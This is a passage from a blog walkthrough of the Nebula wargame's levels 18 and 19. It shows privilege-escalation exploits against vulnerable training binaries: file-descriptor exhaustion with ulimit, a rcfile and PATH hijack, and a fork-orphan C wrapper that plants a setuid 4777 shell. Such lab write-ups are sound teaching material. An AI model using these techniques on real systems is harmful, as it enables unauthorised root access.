      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;logout&#34;</span>, <span style="color:#ae81ff">6</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          globals.loggedin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;shell&#34;</span>, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          dvprintf(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;attempting to start shell</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
          <span style="color:#66d9ef">if</span>(globals.loggedin) {
              execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, envp);
              err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;unable to execve&#34;</span>);
          }
          dprintf(<span style="color:#e6db74">&#34;Permission denied</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;logout&#34;</span>, <span style="color:#ae81ff">4</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          globals.loggedin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;closelog&#34;</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          <span style="color:#66d9ef">if</span>(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile <span style="color:#f92672">=</span> NULL;
      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;site exec&#34;</span>, <span style="color:#ae81ff">9</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          notsupported(line <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>);
      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;setuser&#34;</span>, <span style="color:#ae81ff">7</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          setuser(line <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
      }
  }

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does <code>execve(&quot;/bin/sh&quot;, argv, envp);</code>.</p>
<p>I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.</p>
<p>Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is <code>/home/flag18/password</code> and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p</p>
<p>So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a <code>closelog</code> command too. So, I started to play around with <code>ulimit</code>, gradually reducing <code>-n</code> until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.</p>
<p>Without setting the max open files, a sample run would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level18@nebula:~$ touch /tmp/log
level18@nebula:~$ tail -f /tmp/log &amp;
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">6499</span>

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
Starting up. Verbose level <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
login egg
got <span style="color:#f92672">[</span>login egg<span style="color:#f92672">]</span> as input
attempting to login
shell
got <span style="color:#f92672">[</span>shell<span style="color:#f92672">]</span> as input
attempting to start shell
Permission denied
</code></pre></div><p>Dropping the max open files to 4 though, we get:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level18@nebula:~$ ulimit -n <span style="color:#ae81ff">4</span>

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
login egg
got <span style="color:#f92672">[</span>login egg<span style="color:#f92672">]</span> as input
attempting to login
logged in successfully <span style="color:#f92672">(</span>without password file<span style="color:#f92672">)</span>
shell
got <span style="color:#f92672">[</span>shell<span style="color:#f92672">]</span> as input
attempting to start shell
/home/flag18/flag18: error <span style="color:#66d9ef">while</span> loading shared libraries: libncurses.so.5: cannot open shared object file: Error <span style="color:#ae81ff">24</span>
</code></pre></div><p>Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that <code>closelog</code> command that will free up a file descriptor. Rerunning the above but calling <code>closelog</code> before we call <code>shell</code> results in:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
login egg
got <span style="color:#f92672">[</span>login egg<span style="color:#f92672">]</span> as input
attempting to login
logged in successfully <span style="color:#f92672">(</span>without password file<span style="color:#f92672">)</span>
closelog
got <span style="color:#f92672">[</span>closelog<span style="color:#f92672">]</span> as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 <span style="color:#f92672">[</span>GNU long option<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>option<span style="color:#f92672">]</span> ...
    /home/flag18/flag18 <span style="color:#f92672">[</span>GNU long option<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>option<span style="color:#f92672">]</span> script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      <span style="color:#f92672">(</span>invocation only<span style="color:#f92672">)</span>
    -abefhkmnptuvxBCHP or -o option
</code></pre></div><p>Examining the error we get now together with the source code, it was clear that the arguments sent to the <code>flag18</code> binary was also passed to the <code>execve()</code> call. That means that the error is actually sourced from the fact that <code>sh</code> has no <code>-d</code> flag. In fact, one could replicate this error by simply calling <code>sh -d</code>. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the <em>GNU long options</em> are shown. <code>--rcfile</code> seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running <code>flag18</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;-&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;r&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;c&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;f&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;i&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;l&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;e&#39;</span>
tail: /tmp/log: file truncated
Starting up. Verbose level <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
login egg
got <span style="color:#f92672">[</span>login egg<span style="color:#f92672">]</span> as input
attempting to login
logged in successfully <span style="color:#f92672">(</span>without password file<span style="color:#f92672">)</span>
closelog
got <span style="color:#f92672">[</span>closelog<span style="color:#f92672">]</span> as input
shell
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: got: command not found
/tmp/log: line 3: attempting: command not found
/tmp/log: line 4: syntax error near unexpected token <span style="color:#e6db74">`</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">/tmp/log: line 4: `logged in successfully (without password file)&#39;</span>
</code></pre></div><p>The line <code>Starting: command not found</code> was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my <code>PATH</code> and used it to prepare a small SETUID C shell.</p>
<p>So, to solve level18:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level18@nebula:~$ vim /var/tmp/Starting
level18@nebula:~$ chmod +x /var/tmp/Starting
level18@nebula:~$ cat /var/tmp/Starting
<span style="color:#75715e">#!/bin/sh</span>
/bin/sh

level18@nebula:~$ tail -f /tmp/log &amp;
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">7627</span>

level18@nebula:~$ Starting up. Verbose level <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
got <span style="color:#f92672">[</span>login egg<span style="color:#f92672">]</span> as input
attempting to login
logged in successfully <span style="color:#f92672">(</span>without password file<span style="color:#f92672">)</span>
got <span style="color:#f92672">[</span>closelog<span style="color:#f92672">]</span> as input

level18@nebula:~$ export PATH<span style="color:#f92672">=</span>/var/tmp:$PATH
level18@nebula:~$ ulimit -n <span style="color:#ae81ff">4</span>

level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;-&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;r&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;c&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;f&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;i&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;l&#39;</span>
/home/flag18/flag18: invalid option -- <span style="color:#e6db74">&#39;e&#39;</span>
tail: /tmp/log: file truncated
Starting up. Verbose level <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
login egg
got <span style="color:#f92672">[</span>login egg<span style="color:#f92672">]</span> as input
attempting to login
logged in successfully <span style="color:#f92672">(</span>without password file<span style="color:#f92672">)</span>
closelog
got <span style="color:#f92672">[</span>closelog<span style="color:#f92672">]</span> as input
shell

sh-4.2$ getflag
sh: start_pipeline: pgrp pipe: Too many open files
You have successfully executed getflag on a target account
</code></pre></div><h2 id="level19">level19</h2>
<p><a href="https://exploit-exercises.com/nebula/level19/">Level19&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a flaw in the below program in how it operates.</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  pid_t pid;
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">256</span>];
  <span style="color:#66d9ef">struct</span> stat statbuf;

  <span style="color:#75715e">/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>

  snprintf(buf, <span style="color:#66d9ef">sizeof</span>(buf)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;/proc/%d&#34;</span>, getppid());

  <span style="color:#75715e">/* stat() it */</span>

  <span style="color:#66d9ef">if</span>(stat(buf, <span style="color:#f92672">&amp;</span>statbuf) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
      printf(<span style="color:#e6db74">&#34;Unable to check parent process</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style="color:#75715e">/* check the owner id */</span>

  <span style="color:#66d9ef">if</span>(statbuf.st_uid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
      <span style="color:#75715e">/* If root started us, it is ok to start the shell */</span>

      execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, envp);
      err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to execve&#34;</span>);
  }

  printf(<span style="color:#e6db74">&#34;You are unauthorized to run this program</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}
</code></pre></div><p>This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a <code>fork()</code> operation on the <code>flag19</code> binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.</p>
<p>To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can <code>execv()</code> the <code>flag19</code> binary and prepare a shell :)</p>
<p>So, to solve level19:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">level19@nebula:/var/tmp$ vim pwn19.c
level19@nebula:/var/tmp$ cat pwn19.c
<span style="color:#75715e">#include&lt;stdio.h&gt;</span>
<span style="color:#75715e">#include&lt;unistd.h&gt;</span>

int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>

    pid_t pid <span style="color:#f92672">=</span> fork<span style="color:#f92672">()</span>;

    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>pid <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>

        char *arg<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span> , <span style="color:#e6db74">&#34;-c&#34;</span> , <span style="color:#e6db74">&#34;gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19&#34;</span> , NULL<span style="color:#f92672">}</span>;
        sleep<span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>; /* Give the fork <span style="color:#ae81ff">2</span> sec to orphan */
        execv<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/home/flag19/flag19&#34;</span>, arg<span style="color:#f92672">)</span>;
        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Done fork\n&#34;</span><span style="color:#f92672">)</span>;
        <span style="color:#66d9ef">return</span> 0;
    <span style="color:#f92672">}</span>

    printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Done parent\n&#34;</span><span style="color:#f92672">)</span>;
    <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
level19@nebula:/var/tmp$ ./pwn19
Done parent

level19@nebula:/var/tmp$ /var/tmp/flag19
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id="conclusion">conclusion</h2>
<p>Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&hellip; ;)</p>
<p>As a final touch, my &lsquo;loot&rsquo; in <code>/var/tmp</code> after finishing the last level:</p>
<figure>
    <img src="https://leonjza.github.io/images/nebula_done.png"/> 
</figure>
  </div>
  <div id="disqus_thread"></div>
</div>


<script type="text/javascript">
var disqus_shortname = "slashnote";
(function () {
    var s = document.createElement('script'); s.async = true;
    s.type = 'text/javascript';
    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
}());
</script>



<script type="text/javascript">
    var disqus_shortname = "slashnote";
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
</body>
</html>

